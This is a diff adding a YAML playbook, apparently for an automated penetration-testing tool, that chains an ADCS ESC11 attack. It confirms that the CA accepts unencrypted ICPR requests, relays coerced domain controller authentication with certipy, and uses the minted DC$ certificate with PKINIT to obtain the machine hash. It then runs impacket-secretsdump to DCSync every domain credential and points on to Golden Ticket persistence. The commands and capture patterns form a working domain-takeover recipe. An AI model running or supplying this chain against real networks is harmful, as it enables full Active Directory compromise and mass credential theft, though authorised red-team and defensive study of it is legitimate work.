@@ -1,0 +1,85 @@
+id: esc11-adcs-icpr-relay
+name: "ADCS ESC11 — relay over ICPR (RPC) without encryption"
+description: >
+  CA missing IF_ENFORCEENCRYPTICERTREQUEST. RPC cert-request channel
+  accepts un-encrypted requests → relay coerced machine auth into a cert
+  for the relayed identity. The MS-ICPR cousin of ESC8.
+tags: [adcs, esc11, ntlm-relay, coercion, certificates]
+difficulty: hard
+
+inputs:
+  - name: dc_ip
+    source: target_context.ip
+    required: true
+  - name: ca_ip
+    description: "IP of the ADCS server."
+    required: true
+  - name: listener_ip
+    description: "Your attacker IP."
+    required: true
+
+steps:
+  - id: find_esc11
+    name: "Confirm CA is ESC11 (un-encrypted ICPR)"
+    command_ref: certipy-find
+    inputs:
+      ip: "${dc_ip}"
+    notes: |
+      Look at the CA section: `Enforce Encryption for Requests: False` →
+      ESC11 viable. Newer CAs default to True; older deployments and
+      poorly managed CAs flip it for compatibility.
+
+  - id: start_relay
+    name: "Start certipy relay (ICPR target)"
+    command_ref: certipy-esc11
+    inputs:
+      ip: "${ca_ip}"
+    notes: |
+      Run as: `certipy relay -target rpc://<ca_ip>` (the rpc:// scheme
+      enables ICPR mode). Leave it running.
+
+  - id: coerce_dc
+    name: "Coerce DC machine auth to the relay"
+    command_ref: coercer
+    inputs:
+      listener_ip: "${listener_ip}"
+      target_ip: "${dc_ip}"
+    notes: |
+      DC$ authenticates → certipy mints a cert FOR THE DC machine account
+      (i.e. you get a cert you can authenticate as DC$).
+
+  - id: capture_pfx
+    name: "Pick up the PFX from certipy output"
+    inline_command: "# Look for: [+] Saved certificate and private key to '<dc>$.pfx'"
+    capture:
+      - var: dc_pfx
+        regex: "Saved certificate and private key to '(\\S+\\$\\.pfx)'"
+        match: first
+
+  - id: pkinit_auth
+    name: "PKINIT as DC$ → NT hash of DC machine account"
+    command_ref: certipy-auth
+    requires: [dc_pfx]
+    inputs:
+      pfx_file: "${dc_pfx}"
+      ip: "${dc_ip}"
+    capture:
+      - var: dc_machine_hash
+        regex: "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})"
+        match: first
+
+  - id: dcsync
+    name: "DCSync as DC$ (machine accounts have replication rights)"
+    inline_command: "impacket-secretsdump -hashes ':<hash>' '<domain>/<DC_NAME>$@<dc-ip>' -just-dc"
+    inputs:
+      hash: "${dc_machine_hash}"
+      dc-ip: "${dc_ip}"
+
+references:
+  - title: "Certipy ESC11 deep dive"
+    url:   "https://research.ifcr.dk/relaying-to-ad-certificate-services-over-rpc-7211c45b35c0"
+
+next_chains:
+  - chain: ad-persistence-golden-ticket
+    when:   'krbtgt hash captured'
+    reason: 'Persist via Golden Ticket.'
